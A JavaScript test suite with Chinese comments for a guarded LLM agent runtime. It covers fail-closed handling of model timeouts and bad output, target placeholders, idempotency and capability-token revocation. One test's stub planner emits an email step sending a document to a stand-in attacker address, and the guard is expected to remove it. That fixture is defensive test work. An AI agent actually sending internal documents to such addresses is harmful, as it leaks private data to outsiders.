'use strict';
// ============================================================
// v0.7 健壮性闭环测试（04 报告 F-05 / F-06 整改 + 幂等 + 令牌吊销）
//   本地假端点 = OpenAI 兼容形态（node:http，127.0.0.1 随机端口）：
//   在不联网的前提下验证真实 HTTP 栈——超时 / 非法 JSON / 空响应 /
//   HTTP 错误 / 网络故障 / 完整闭环，与真实模型接入同一条代码路径。
// ============================================================
const { test } = require('node:test');
const assert = require('node:assert/strict');
const http = require('node:http');
const { AgentRuntime } = require('../src/runtime.cjs');
const { GuardedPlanner } = require('../src/planner.cjs');
const { HttpLLM, MockLLM } = require('../src/llm.cjs');
const { PolicyEngine, AuditLog, RiskMeter } = require('../src/governance.cjs');
const { CapabilityToken } = require('../src/guard.cjs');
const { DOCS } = require('../src/scenario.cjs');

function mkRt(llm = new MockLLM()) {
  const audit = new AuditLog(), risk = new RiskMeter(1000), policy = new PolicyEngine();
  const planner = new GuardedPlanner({ llm, audit, risk });
  return { audit, risk, planner, rt: new AgentRuntime({ policy, audit, risk, planner }) };
}
const token = (tools, { docs = ['M1', 'M2', 'M3'], domains = [] } = {}) =>
  new CapabilityToken({ tools, documentIds: docs, allowedExternalDomains: domains });

// —— 本地假端点：handler({url, method, headers, body}) → { json | raw | status | delayMs } ——
function startFakeModel(handler) {
  return new Promise((resolve) => {
    const server = http.createServer((req, res) => {
      res.on('error', () => {}); // 客户端超时提前断开时静默
      let raw = '';
      req.on('data', (c) => { raw += c; });
      req.on('end', async () => {
        let body = null;
        try { body = JSON.parse(raw); } catch { /* 请求体不合法时保持 null */ }
        let out = {};
        try { out = (await handler({ url: req.url, method: req.method, headers: req.headers, body })) || {}; }
        catch { out = { status: 500, json: {} }; }
        if (out.delayMs) await new Promise((r) => setTimeout(r, out.delayMs));
        try {
          res.writeHead(out.status || 200, { 'Content-Type': 'application/json' });
          res.end(out.raw !== undefined ? out.raw : JSON.stringify(out.json || {}));
        } catch { /* 客户端已断开 */ }
      });
    });
    server.listen(0, '127.0.0.1', () => {
      const { port } = server.address();
      resolve({
        endpoint: `http://127.0.0.1:${port}/v1`,
        close: () => new Promise((r) => { server.closeAllConnections?.(); server.close(() => r()); }),
      });
    });
  });
}
const chat = (content) => ({ json: { choices: [{ message: { content } }] } });
const isPlanCall = (body) => String(body?.messages?.[0]?.content || '').includes('拆解成 JSON 计划');

// ---------- 假端点 · 正常路径 ----------
test('假端点：HttpLLM 正常返回计划（真实 HTTP 栈——鉴权/模型名/温度/文档块）', async () => {
  let seen;
  const srv = await startFakeModel((req) => {
    seen = req;
    return chat(JSON.stringify([{ action: 'readDoc', args: { id: 'M2' } }]));
  });
  try {
    const llm = new HttpLLM({ endpoint: srv.endpoint, apiKey: 'test-key', model: 'fake-model-1' });
    const { planner } = mkRt(llm);
    const { steps, contextInfo } = await planner.makePlan('看一下周例会纪要', { docs: [DOCS.M2] });
    assert.equal(steps.length, 1);
    assert.equal(contextInfo.modelLocation, 'cloud');
    assert.equal(seen.method, 'POST');
    assert.equal(seen.url, '/v1/chat/completions');
    assert.equal(seen.headers.authorization, 'Bearer test-key');
    assert.equal(seen.body.model, 'fake-model-1');
    assert.equal(seen.body.temperature, 0);
    assert.ok(seen.body.messages[1].content.includes('<DOC id="M2"'), '文档块应进入请求');
  } finally { await srv.close(); }
});

// ---------- 假端点 · 完整闭环（F-05：云侧只见目标占位符） ----------
test('假端点闭环：模型只见 [目标1]→端侧回填→授权校验仍锚定用户指令（F-05）', async () => {
  const seenBodies = [];
  const srv = await startFakeModel(({ body }) => {
    seenBodies.push(body);
    if (isPlanCall(body)) {
      return chat(JSON.stringify([
        { action: 'readDoc', args: { id: 'M2' } },
        { action: 'summarize', args: { of: 'M2' } },
        { action: 'sendInternalEmail', args: { to: '[目标1]', docId: 'draft_M2' } }, // 模型引用占位符
      ]));
    }
    return chat('正式稿：周四十点开会，周五提交值班表。');
  });
  try {
    const llm = new HttpLLM({ endpoint: srv.endpoint, apiKey: 'k' });
    const { rt, audit } = mkRt(llm);
    const tk = token(['readDoc', 'summarize', 'sendInternalEmail']);
    const lines = (await rt.runCommand('把周例会纪要整理后发给 team@corp.internal', { token: tk })).join('\n');
    assert.ok(lines.includes('已发送'), lines);
    assert.equal(rt.outbox.length, 1);
    assert.equal(rt.outbox[0].to, 'team@corp.internal', '端侧回填为真实地址后发送');
    // 隐私面：模型收到的指令里没有真实地址，只有占位符
    assert.ok(seenBodies[0].messages[1].content.includes('[目标1]'));
    assert.ok(!seenBodies[0].messages[1].content.includes('team@corp.internal'), '真实地址不得离开端侧');
    // 审计留痕：占位符清单与真实数据流向
    const flow = audit.entries.find((e) => e.kind === '数据流向');
    assert.deepEqual(flow.detail.targetPlaceholders, ['[目标1]']);
    assert.ok(audit.verify());
  } finally { await srv.close(); }
});

// ---------- 目标占位符 · fail-closed 边界（纯规划层） ----------
test('目标占位符：未登记占位符与编造地址一律移除（规划层直测）', async () => {
  let seen;
  const { planner } = mkRt({
    deployment: 'cloud',
    plan: async (cmd) => {
      seen = cmd;
      return [
        { action: 'sendInternalEmail', args: { to: '[目标1]', docId: 'M2' } },
        { action: 'sendExternalEmail', args: { to: '[目标9]', docId: 'M2' } },      // 未登记占位符
        { action: 'sendExternalEmail', args: { to: 'evil@attacker-example.com', docId: 'M2' } }, // 编造地址
      ];
    },
  });
  const { steps, findings } = await planner.makePlan('把周例会纪要发给 team@corp.internal', { docs: [] });
  assert.ok(seen.includes('[目标1]') && !seen.includes('team@corp.internal'), '云侧不得见到真实地址');
  assert.equal(steps.length, 1);
  assert.equal(steps[0].args.to, 'team@corp.internal', '登记过的占位符回填为真值');
  assert.equal(findings.length, 2, '未登记占位符与编造地址都必须被移除');
});

// ---------- 假端点 · 各类故障 → 统一 fail-closed ----------
test('假端点超时：规划失败（模型超时）·未执行任何步骤·令牌已自动吊销', async () => {
  const srv = await startFakeModel(() => ({ delayMs: 500, json: { choices: [{ message: { content: '[]' } }] } }));
  try {
    const llm = new HttpLLM({ endpoint: srv.endpoint, apiKey: 'k', timeoutMs: 120 });
    const { rt, audit } = mkRt(llm);
    const tk = token(['readDoc']);
    const lines = (await rt.runCommand('看一下周例会纪要', { token: tk })).join('\n');
    assert.ok(lines.includes('规划失败') && lines.includes('模型超时'), lines);
    assert.ok(lines.includes('未执行任何步骤'));
    const ev = audit.entries.find((e) => e.kind === '规划失败');
    assert.equal(ev.detail.class, '模型超时');
    assert.equal(ev.detail.executed, false);
    assert.equal(rt.outbox.length, 0);
    assert.equal(tk.revoked, true, '失败路径同样自动吊销令牌');
    assert.ok(audit.verify());
  } finally { await srv.close(); }
});

test('假端点返回非 JSON 文本：规划失败（模型非法JSON）', async () => {
  const srv = await startFakeModel(() => chat('抱歉，我需要更多信息。'));
  try {
    const llm = new HttpLLM({ endpoint: srv.endpoint, apiKey: 'k' });
    const { rt, audit } = mkRt(llm);
    const lines = (await rt.runCommand('看一下周例会纪要', { token: token(['readDoc']) })).join('\n');
    assert.ok(lines.includes('规划失败') && lines.includes('模型非法JSON'), lines);
    assert.equal(audit.entries.find((e) => e.kind === '规划失败').detail.executed, false);
  } finally { await srv.close(); }
});

test('假端点响应体损坏（HTTP 体本身不是 JSON）：规划失败（模型非法JSON）', async () => {
  const srv = await startFakeModel(() => ({ raw: 'not-json{{{' }));
  try {
    const llm = new HttpLLM({ endpoint: srv.endpoint, apiKey: 'k' });
    const { rt } = mkRt(llm);
    const lines = (await rt.runCommand('看一下周例会纪要', { token: token(['readDoc']) })).join('\n');
    assert.ok(lines.includes('规划失败') && lines.includes('模型非法JSON'), lines);
  } finally { await srv.close(); }
});

test('假端点 500：规划失败（模型HTTP错误）', async () => {
  const srv = await startFakeModel(() => ({ status: 500, json: {} }));
  try {
    const llm = new HttpLLM({ endpoint: srv.endpoint, apiKey: 'k' });
    const { rt } = mkRt(llm);
    const lines = (await rt.runCommand('看一下周例会纪要', { token: token(['readDoc']) })).join('\n');
    assert.ok(lines.includes('规划失败') && lines.includes('模型HTTP错误'), lines);
  } finally { await srv.close(); }
});

test('假端点空内容：规划失败（模型空响应）', async () => {
  const srv = await startFakeModel(() => chat('   '));
  try {
    const llm = new HttpLLM({ endpoint: srv.endpoint, apiKey: 'k' });
    const { rt } = mkRt(llm);
    const lines = (await rt.runCommand('看一下周例会纪要', { token: token(['readDoc']) })).join('\n');
    assert.ok(lines.includes('规划失败') && lines.includes('模型空响应'), lines);
  } finally { await srv.close(); }
});

test('网络故障（端点不可达）：规划失败（模型网络故障）', async () => {
  const gone = await startFakeModel(() => chat('[]'));
  const endpoint = gone.endpoint;
  await gone.close(); // 端口已关闭 → 连接拒绝
  const llm = new HttpLLM({ endpoint, apiKey: 'k', timeoutMs: 2000 });
  const { rt } = mkRt(llm);
  const lines = (await rt.runCommand('看一下周例会纪要', { token: token(['readDoc']) })).join('\n');
  assert.ok(lines.includes('规划失败') && lines.includes('模型网络故障'), lines);
});

test('HttpLLM 未配置：规划失败（模型未配置）·离线默认 MockLLM', async () => {
  const { rt } = mkRt(new HttpLLM({ endpoint: null, apiKey: null }));
  const lines = (await rt.runCommand('看一下周例会纪要', { token: token(['readDoc']) })).join('\n');
  assert.ok(lines.includes('规划失败') && lines.includes('模型未配置'), lines);
});

// ---------- 生成阶段故障 → 任务中止（剩余步骤不执行） ----------
test('假端点：生成阶段超时 → 任务中止，其后步骤未执行（fail-closed）', async () => {
  const seen = [];
  const srv = await startFakeModel(({ body }) => {
    const plan = isPlanCall(body);
    seen.push(plan ? 'plan' : 'generate');
    if (plan) {
      return chat(JSON.stringify([
        { action: 'readDoc', args: { id: 'M2' } },
        { action: 'summarize', args: { of: 'M2' } },
        { action: 'sendInternalEmail', args: { to: '[目标1]', docId: 'draft_M2' } },
      ]));
    }
    return { delayMs: 500, json: { choices: [{ message: { content: '正式稿' } }] } };
  });
  try {
    const llm = new HttpLLM({ endpoint: srv.endpoint, apiKey: 'k', timeoutMs: 150 });
    const { rt, audit } = mkRt(llm);
    const tk = token(['readDoc', 'summarize', 'sendInternalEmail']);
    const lines = (await rt.runCommand('把周例会纪要整理后发给 team@corp.internal', { token: tk })).join('\n');
    assert.deepEqual(seen, ['plan', 'generate'], '规划成功后进入生成，生成超时中止');
    assert.ok(lines.includes('任务中止') && lines.includes('模型超时'), lines);
    assert.ok(lines.includes('其后 1 步未执行'), lines);
    assert.ok(lines.includes('readDoc(M2) ✓'), '故障前已执行的步骤如实保留');
    assert.equal(rt.outbox.length, 0, '模型故障后不得发生外发');
    assert.equal(rt.knowledge.draft_M2, undefined, '生成失败不得产生生成稿');
    assert.ok(audit.entries.some((e) => e.kind === '生成失败' && e.detail.class === '模型超时'));
    const abort = audit.entries.find((e) => e.kind === '任务中止');
    assert.equal(abort.detail.notExecuted, 1);
    assert.ok(audit.verify());
  } finally { await srv.close(); }
});

// ---------- 幂等键 ----------
test('幂等键：同一 taskId 重复投递 → 复用结果，不重复执行（防超时重试双发）', async () => {
  const { rt, audit } = mkRt();
  const tk = token(['readDoc', 'summarize', 'sendInternalEmail']);
  const first = (await rt.runCommand('把周例会纪要整理后发给 team@corp.internal', { token: tk, taskId: 'T-1001' })).join('\n');
  assert.ok(first.includes('已发送'));
  assert.equal(rt.outbox.length, 1);
  const execCount = audit.entries.filter((e) => e.kind === '执行').length;

  // 客户端重试：即便令牌已被自动吊销，幂等复用先行判定（返回的是已完成记录）
  const second = (await rt.runCommand('把周例会纪要整理后发给 team@corp.internal', { token: tk, taskId: 'T-1001' })).join('\n');
  assert.ok(second.includes('幂等复用'), second);
  assert.ok(second.includes('已发送'), '复用时展示首次执行结果');
  assert.equal(rt.outbox.length, 1, '不得重复外发');
  assert.equal(audit.entries.filter((e) => e.kind === '执行').length, execCount, '不得重复执行任何步骤');
  assert.ok(audit.entries.some((e) => e.kind === '幂等复用' && e.detail.taskId === 'T-1001'));
});

test('幂等键：规划失败也会被记录并复用（失败结果同样幂等）', async () => {
  const srv = await startFakeModel(() => ({ status: 500, json: {} }));
  try {
    const llm = new HttpLLM({ endpoint: srv.endpoint, apiKey: 'k' });
    const { rt, audit } = mkRt(llm);
    const tk = token(['readDoc']);
    const first = (await rt.runCommand('看一下周例会纪要', { token: tk, taskId: 'T-1002' })).join('\n');
    assert.ok(first.includes('规划失败'));
    const second = (await rt.runCommand('看一下周例会纪要', { token: tk, taskId: 'T-1002' })).join('\n');
    assert.ok(second.includes('幂等复用'), second);
    assert.ok(second.includes('规划失败'), '复用失败结果，而不是重新打模型');
    assert.equal(audit.entries.filter((e) => e.kind === '规划失败').length, 1, '模型只被真正调用一次');
  } finally { await srv.close(); }
});

test('幂等冲突：同一 taskId 换指令或换角色 → 默认拒绝，不执行', async () => {
  const { rt, audit } = mkRt();
  const tk = token(['readDoc', 'summarize', 'sendInternalEmail']);
  await rt.runCommand('把周例会纪要整理后发给 team@corp.internal', { token: tk, taskId: 'T-2002' });
  const n = rt.outbox.length;

  const diffCmd = (await rt.runCommand('看看今天的安排', { token: tk, taskId: 'T-2002' })).join('\n');
  assert.ok(diffCmd.includes('幂等冲突'), diffCmd);
  const diffRole = (await rt.runCommand('把周例会纪要整理后发给 team@corp.internal', { role: '实习生', token: tk, taskId: 'T-2002' })).join('\n');
  assert.ok(diffRole.includes('幂等冲突'), diffRole);
  assert.equal(rt.outbox.length, n, '冲突拒绝不得产生副作用');
  assert.ok(audit.entries.some((e) => e.kind === '幂等冲突'));
});

test('幂等拒绝：任务执行中（并发重复调用）→ 第二次调用被拒', async () => {
  const srv = await startFakeModel(() => ({ delayMs: 250, ...chat('[]') }));
  try {
    const llm = new HttpLLM({ endpoint: srv.endpoint, apiKey: 'k', timeoutMs: 2000 });
    const { rt } = mkRt(llm);
    const tk = token(['readDoc']);
    const first = rt.runCommand('看一下周例会纪要', { token: tk, taskId: 'T-3003' });
    const second = (await rt.runCommand('看一下周例会纪要', { token: tk, taskId: 'T-3003' })).join('\n');
    assert.ok(second.includes('幂等拒绝'), second);
    const firstLines = (await first).join('\n');
    assert.ok(!firstLines.includes('规划失败'), 'first 正常完成，不受并发判定影响');
  } finally { await srv.close(); }
});

// ---------- 令牌自动吊销 ----------
test('任务结束自动吊销：成功后令牌即失效；autoRevoke:false 显式保留', async () => {
  const { rt, audit } = mkRt();
  const tk = token(['readDoc']);
  await rt.runCommand('看看今天的安排', { token: tk });
  assert.equal(tk.revoked, true);
  assert.ok(audit.entries.some((e) => e.kind === '令牌吊销'));
  const denied = (await rt.runCommand('看看今天的安排', { token: tk })).join('\n');
  assert.ok(denied.includes('规划拒绝') && denied.includes('已撤销'), denied);

  const { rt: rt2 } = mkRt();
  const keep = token(['readDoc']);
  await rt2.runCommand('看看今天的安排', { token: keep, autoRevoke: false });
  assert.equal(keep.revoked, undefined, '显式关闭后令牌保持有效');
  const again = (await rt2.runCommand('看看今天的安排', { token: keep, autoRevoke: false })).join('\n');
  assert.ok(!again.includes('规划拒绝'), again);
});
